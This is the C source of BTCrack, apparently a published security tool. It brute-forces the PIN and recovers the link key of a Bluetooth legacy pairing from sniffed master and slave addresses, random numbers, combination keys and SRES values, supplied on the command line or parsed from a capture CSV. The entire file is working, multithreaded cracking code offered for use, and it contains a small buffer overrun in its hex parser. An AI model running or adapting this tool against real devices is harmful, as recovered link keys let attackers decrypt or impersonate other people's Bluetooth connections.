/*
 This program is free software; you can redistribute it and/or
 modify it under the terms of the GNU General Public License 2
 as published by the Free Software Foundation.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License 2 for more details.

 You should have received a copy of the GNU General Public License 2
 along with this program; if not, write to the Free Software
 Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 
 It grants to you the four following freedoms:
   0. The freedom to run the program for any purpose.
   1. The freedom to study how the program works and adapt it to your needs.
   2. The freedom to redistribute copies so you can help your neighbor.
   3. The freedom to improve the program and release your improvements to 
      the public, so that the whole community benefits.

 You must conspicuously and appropriately publish on each copy distributed an 
 appropriate copyright notice and disclaimer of warranty and keep intact all the 
 notices that refer to this License and to the absence of any warranty; and give 
 any other recipients of the Program a copy of the GNU General Public License 
 along with the Program. Any translation of the GNU General Public License must 
 be accompanied by the GNU General Public License.
 
 If you modify your copy or copies of the program or any portion of it, or 
 develop a program based upon it, you may distribute the resulting work provided
 you do so under the GNU General Public License. Any translation of the GNU General Public License
 must be accompanied by the GNU General Public License.
 
 If you copy or distribute the program, you must accompany it with the complete 
 corresponding machine-readable source code or with a written offer, valid for 
 at least three years, to furnish the complete corresponding machine-readable 
 source code.
  
 Contact : Thierry Zoller  Thierry.zoller@nruns.com / Thierry@Zoller.lu
 Contact : Eric Sesterhen  snakebyte@gmx.de
 n.runs AG - http://www.nruns.com

 THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.
*/
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include "btcrack.h"

struct  BTCrackStruct BTCrackArray[MAX_THREADS];
int	t_max;
int 	shmid;
int	pin_solved;

static int StringToHex (char *string, char *hexstr, int len) {
	char *ptr;
	char digits[3];
	int i;

	
	if (!string)
		return -1;
	
	if (strlen(string) < (unsigned int) len * 2)
		return -1;

	ptr = string;

	for(i=0; i < len; i++) {
		memcpy(&digits, ptr, 2);
		digits[3] = '\0';

		hexstr[i] = strtoul((const char *)&digits, NULL, 16);
		
		ptr+=2;

		if((*ptr == ' ') || (*ptr == ':'))
			ptr++;

	}

	return 1;
}


static void RewindBTAddr(char *addr) {
	char revaddr[6];
	revaddr[0] = addr[5];
	revaddr[1] = addr[4];
	revaddr[2] = addr[3];
	revaddr[3] = addr[2];
	revaddr[4] = addr[1];
	revaddr[5] = addr[0];
	memcpy(addr, revaddr, 6);
}

static int InitBTStruct (
		char *MasterBTAddr, 
		char *SlaveBTAddr, 
		char *InRand,
		char *MasterCombKey,
		char *SlaveCombKey,
		char *MasterAuRand, 
		char *SlaveAuRand, 
		char *MasterSres,
		char *SlaveSres,
		char *MaxPinLength,
		char *Error)
{
	int i;
	int UserLengthMin=MIN_LENGTH, UserLengthMax=MAX_LENGTH;
	struct BTCrackStruct *myBTCrack;

	myBTCrack = &BTCrackArray[0];
	memset(myBTCrack, 0, sizeof(struct BTCrackStruct));

	UserLengthMax = atoi(MaxPinLength);
	if ((UserLengthMax <= 0) || (UserLengthMax > MAX_LENGTH)) {
		sprintf(Error, "%s", "ERROR: Invald MAX PIN length. Must be between 1 and 16");
		return -1;
	}


	if (UserLengthMin > UserLengthMax) {
		sprintf(Error, "%s", "ERROR: MIN PIN length is more than MAX PIN length.");
		return -1;
	}


	 /* MASTER BD_ADDR */
	if (StringToHex(MasterBTAddr, (char *) myBTCrack->bdaddr_m, 6) < 0) {
		sprintf(Error, "%s", "Bad master BD_ADDR.");
		return -1;
	}
	RewindBTAddr((char *) myBTCrack->bdaddr_m);


	/* SLAVE BD_ADDR */
	if (StringToHex(SlaveBTAddr, (char *) myBTCrack->bdaddr_s, 6) < 0) {
		sprintf(Error, "%s", "Bad slave BD_ADDR.");
		return -1;
	}
	RewindBTAddr((char *) myBTCrack->bdaddr_s);


	/* IN_RAND */
	if (StringToHex(InRand, (char *) myBTCrack->in_rand, 16) < 0) {
		sprintf(Error, "%s", "Bad IN_RAND.");
		return -1;
	}

	/* MASTER COMB_KEY */
	if (StringToHex(MasterCombKey, (char *) myBTCrack->comb_key_m, 16) < 0) {
		sprintf(Error, "%s", "Bad master COMB_KEY.");
		return -1;
	}


	/* SLAVE COMB_KEY */
	if (StringToHex(SlaveCombKey, (char *) myBTCrack->comb_key_s, 16) < 0) {
		sprintf(Error, "%s", "Bad slave COMB_KEY.");
		return -1;
	}

	/* MASTER AU_RAND */
	if (StringToHex(MasterAuRand, (char *) myBTCrack->au_rand_m, 16) < 0) {
		sprintf(Error, "%s", "Bad master AU_RAND.");
		return -1;
	}

	/* SLAVE AU_RAND */
	if (StringToHex(SlaveAuRand, (char *) myBTCrack->au_rand_s, 16) < 0) {
		sprintf(Error, "%s", "Bad slave AU_RAND.");
		return -1;
	}


	/* MASTER SRES */
	if (StringToHex(MasterSres, (char *) myBTCrack->sres_m, 4) < 0) {
		sprintf(Error, "%s", "Bad master SRES.");
		return -1;
	}


	/* SLAVE SRES */
	if (StringToHex(SlaveSres, (char *) myBTCrack->sres_s, 4) < 0) {
		sprintf(Error, "%s", "Bad slave SRES.");
		return -1;
	}

	for (i=1; i<t_max; i++) {
		memcpy(&BTCrackArray[i], myBTCrack, sizeof(struct BTCrackStruct));
		BTCrackArray[i].pins_per_sec = 0;
	}
	myBTCrack = &BTCrackArray[t_max-1];

	return 0;
}



void *DoThreadProcessing(void *foo)
{
	unsigned long pin_start;
	unsigned long pin_end;
	unsigned char pin_length;
	char buf[50];	/* 16*3 = 48, so we are definately safe with 50 .) */
	unsigned long i;
	unsigned char testpin[MAX_LENGTH + 1];
	struct BTCrackStruct *ThreadBTCrack = foo;
	char format[7];

	pin_start = ThreadBTCrack->pin_start;
	pin_end = ThreadBTCrack->pin_end;
	pin_length = ThreadBTCrack->pinlen;
	sprintf(format, "%%0%dlu", pin_length);

	ThreadBTCrack->pin_solved = 0;

	for (i = pin_start; i<=pin_end && !pin_solved; i++) {
		memset(testpin, 0, sizeof(testpin));
		sprintf((char *) testpin, format, i);

		ThreadBTCrack->pins_per_sec = ThreadBTCrack->pins_per_sec + 1;
		if (ProcessPIN(ThreadBTCrack, testpin, pin_length) == 0) {

			memcpy(ThreadBTCrack->pin, testpin, pin_length);
			memset(buf, '\0', sizeof(buf));
		 
			/* might want to replace this with a single sprintf call */
			for(i=0; i<16; i++)
				sprintf(&buf[0] + (3*i), "%02x:", ThreadBTCrack->kab[i] & 0xFF);

			buf[strlen(buf) - 1] = '\0';
			sprintf((char *) ThreadBTCrack->link_key, "%s", buf);
			sprintf((char *) ThreadBTCrack->pin, "%s", (char *) testpin);
			ThreadBTCrack->pin_solved = 1;
			pin_solved = 1;
			return NULL;
		}
	}
	return NULL;
}

static int vbProcessPINInterval (
	int pin_length,
	unsigned long pin_start, 
	unsigned long pin_end, 
	char *sPin,
	char *sLinkKey,
	unsigned long *PinsPerSec)
{
	long pins_per_thread;
	int  who_solved = 0;
	pthread_t g_hThreadHandle[MAX_THREADS];
	unsigned long total_pins = 0;
	long i;

	pins_per_thread = (pin_end - pin_start + 1)/t_max;
	pin_solved = 0;


	for (i=0; i<t_max; i++)	{
		BTCrackArray[i].pin_start = pin_start + i*pins_per_thread;
		BTCrackArray[i].pin_end = BTCrackArray[i].pin_start + pins_per_thread - 1;
		BTCrackArray[i].pinlen = pin_length;
		
		pthread_create(&g_hThreadHandle[i], NULL, DoThreadProcessing, &BTCrackArray[i]);
	}

	for (i=0; i<t_max; i++) {
		pthread_join(g_hThreadHandle[i], NULL);
		/* Close all thread handles upon completion. */
		g_hThreadHandle[i] = 0;
		total_pins = total_pins + BTCrackArray[i].pins_per_sec;

		if (BTCrackArray[i].pin_solved == 1) {
			pin_solved = 1;
			who_solved = i;
		}
	}

	*PinsPerSec += total_pins;
	if (pin_solved) {
		sprintf(sPin, "%s",(char *) BTCrackArray[who_solved].pin);
		sprintf(sLinkKey, "%s", (char *) BTCrackArray[who_solved].link_key);
		return 0;
	}

	return -1;
}

static void read_csv(char *filename, char **InRand, char **MasterCombKey, char **SlaveCombKey, char **MasterAuRand, char **SlaveAuRand, char **MasterSres, char **SlaveSres, char *buf) {
	FILE *fh;
	char *tmp;
	char *temp[6];
	int start = 0;
	int count = 0;
	int who = 0;	/* 0 = unknown, 1 = master, 2 = slave */
	int what = 0;	/* 0 = unknown, 1 = comb_key, 2 = au_rand, 3 = sres, 4 = in_rand */
	int i;

	fh = fopen(filename, "r");
	if (!fh) {
		printf("Cant open file: %s\n", filename);
		free(buf);
		exit(-1);
	}

	while (fgets(buf, 1024, fh)) {
		switch (start) {
		case 0:
			if (!strncmp(buf, "L,0,PPP,Type,Identifier,Length,Protocol", 39)) {
				start = 2;
			} else if (!strncmp(buf, "Index,Slave/Master,Type,Description", 35)) {
				start = 1;
			}
			break;
		case 1:	/* old csv format */
			tmp = strchr(buf, ',');
			if (!tmp)
				continue;

			if (!*(++tmp))
				continue;

			if (!strncmp(tmp, "Master,", 7)) {
				tmp += 7;
				tmp = strchr(tmp, ',');
				if (!tmp++)
					continue;
				if (!strncmp(tmp, "LMP_comb_key,", 13)) {
					tmp += 16;
					*MasterCombKey = strdup(tmp);
				} else if (!strncmp(tmp, "LMP_au_rand,", 12)) {
					tmp += 15;
					*MasterAuRand = strdup(tmp);
				} else if (!strncmp(tmp, "LMP_sres,", 9)) {
					tmp += 12;
					*MasterSres = strdup(tmp);
				} else if (!strncmp(tmp, "LMP_in_rand,", 12)) {
					tmp += 15;
					*InRand = strdup(tmp);
				}

			} else if (!strncmp(tmp, "Slave,", 6)) {
				tmp += 6;
				tmp = strchr(tmp, ',');
				if (!tmp++)
					continue;

				if (!strncmp(tmp, "LMP_comb_key,", 13)) {
					tmp += 16;
					*SlaveCombKey = strdup(tmp);
				} else if (!strncmp(tmp, "LMP_au_rand,", 12)) {
					tmp += 15;
					*SlaveAuRand = strdup(tmp);
				} else if (!strncmp(tmp, "LMP_sres,", 9)) {
					tmp += 12;
					*SlaveSres = strdup(tmp);
				}
		
			}
			break;
		case 2: /* new csv format */

			tmp = buf;
			for (i=0; i < 6; i++){
				temp[i] = tmp;
				tmp = strchr(tmp, ',');
				if (!tmp)
					break;
				*tmp = '\0';
				tmp++;
			}

			if (atoi(temp[1]) != count) {
				count = atoi(temp[1]);
				/* clear tmp vars */
				who = 0;
				what = 0;
			}
			/* who send this packet ? */			
			if ((*temp[0] == 'S') && (!strncmp(temp[2], "Frame", 5))) {
				if (!strncmp(temp[3], "Master", 6))
					who = 1;
				else if (!strncmp(temp[3], "Slave", 5))
					who = 2;

			} else if ((*temp[0] == 'D') && (*temp[2] == '1') && (!strncmp(temp[3], "Opcode", 6))) {
				if (!strncmp(temp[4], "LMP_comb_key", 13))
					what = 1;
				else if (!strncmp(temp[4], "LMP_au_rand", 12))
					what = 2;
				else if (!strncmp(temp[4], "LMP_sres", 9))
					what = 3;
				else if (!strncmp(temp[4], "LMP_in_rand", 12))
					what = 4;

			} else if ((*temp[0] == 'D') && (*temp[2] == '1') && (!strncmp(temp[3], "Random Number", 13)) &&
					(strlen(temp[4]) > 5)) {
				if (who == 1) {
					switch(what) {
					case 1:	*MasterCombKey = strdup(temp[4]+3); break;
					case 2: *MasterAuRand = strdup(temp[4]+3); break;
					case 3: *MasterSres = strdup(temp[4]+3); printf("%s\n", *MasterSres); break;
					case 4: *InRand = strdup(temp[4]+3); break;
					}

				} else if (who == 2) {
					switch(what) {
					case 1:	*SlaveCombKey = strdup(temp[4]+3); break;
					case 2: *SlaveAuRand = strdup(temp[4]+3); break;
					case 3: *SlaveSres = strdup(temp[4]+3); break;
					case 4: *InRand = strdup(temp[4]+3); break;
					}
				}

			} else if ((*temp[0] == 'D') && (*temp[2] == '1') && (!strncmp(temp[3], "Authentication Response", 23)) &&
					(strlen(temp[4]) > 5)) {
				if (who == 1)
					*MasterSres = strdup(temp[4]+2);
				else if (who == 2)
					*SlaveSres = strdup(temp[4]+2);
			}
			break;
		}
	}
	fclose(fh);
	return;
}

int main(int argc, char **argv) {
	char *MasterBTAddr = NULL;
	char *SlaveBTAddr = NULL;
	char *InRand = NULL;
	char *MasterCombKey = NULL;
	char *SlaveCombKey = NULL;
	char *MasterAuRand = NULL;
	char *SlaveAuRand = NULL;
	char *MasterSres = NULL;
	char *SlaveSres = NULL;
	char *MaxPinLength = NULL;
	char *buf = malloc(1024);
	unsigned long PinLength, PinStart, PinEnd;
	char sPin[512];
	char sLinkKey[512];
	unsigned long PinsPerSec = 0;
	time_t mytime;
	int i, count;

	if (!buf) {
		printf("Out of memory\n");
		return -1;
	}

	if (argc!=11 && argc!=5) { 
		printf("%s <#threads> <master addr> <slave addr> <filename.csv>\n", argv[0]);
		printf("%s <#threads> <master addr> <slave addr> <in_rand> <comb_master> <comb_slave> <au_rand_m> <au_rand_s> <sres_m> <sres_s>\n", argv[0]);	
		free(buf);
		return -1;
	} 

	t_max = atoi(argv[1]);
	MasterBTAddr = strdup(argv[2]);
	SlaveBTAddr = strdup(argv[3]);

	if (t_max <= 0)
		t_max = 1;
	if (t_max > MAX_THREADS)
		t_max = MAX_THREADS;

	if (argc <= 5) {
		read_csv(argv[4], &InRand, &MasterCombKey, &SlaveCombKey, &MasterAuRand, &SlaveAuRand, &MasterSres, &SlaveSres, buf);
	}
	else {
		InRand = strdup(argv[4]);
		MasterCombKey = strdup(argv[5]);
		SlaveCombKey = strdup(argv[6]);
		MasterAuRand = strdup(argv[7]);
		SlaveAuRand = strdup(argv[8]);
		MasterSres = strdup(argv[9]);
		SlaveSres = strdup(argv[10]);
	}
                

	MaxPinLength = strdup("16");

	if (InitBTStruct(MasterBTAddr, SlaveBTAddr, InRand, MasterCombKey, SlaveCombKey, MasterAuRand, SlaveAuRand, MasterSres, SlaveSres, MaxPinLength, buf) < 0) {
		printf("Error occured: %s\n", buf);
		free(MasterBTAddr);
		free(SlaveBTAddr);
		free(InRand);
		free(MasterCombKey);
		free(SlaveCombKey);
		free(MasterAuRand);
		free(SlaveAuRand);
		free(MasterSres);
		free(SlaveSres);
		free(MaxPinLength);
		free(buf);
		return -1;
	}

	free(MasterBTAddr);
	free(SlaveBTAddr);
	free(InRand);
	free(MasterCombKey);
	free(SlaveCombKey);
	free(MasterAuRand);
	free(SlaveAuRand);
	free(MasterSres);
	free(SlaveSres);
	free(buf);

	mytime = time(NULL);

	sPin[0] = '\0';

	count = 1;
	for (i = 1; i <= atoi(MaxPinLength); i++) {
		PinLength = i;
		PinStart = 0;
		count *= 10;
		PinEnd = count-1;
		if (vbProcessPINInterval (PinLength, PinStart, PinEnd, sPin, sLinkKey, &PinsPerSec) == 0) {
			break;
		}
	}

	free(MaxPinLength);
	mytime = (time(NULL) - mytime) + 1;

	if (sPin[0]) {
		printf("Link Key: %s\nPin: %s\nPins/Sec: %lu\n", sLinkKey, sPin, PinsPerSec / (unsigned long) mytime);
	} else {
		printf("Key not found :( Pins/Sec: %lu\n", PinsPerSec / (unsigned long) mytime);
	}

	return 0;
}
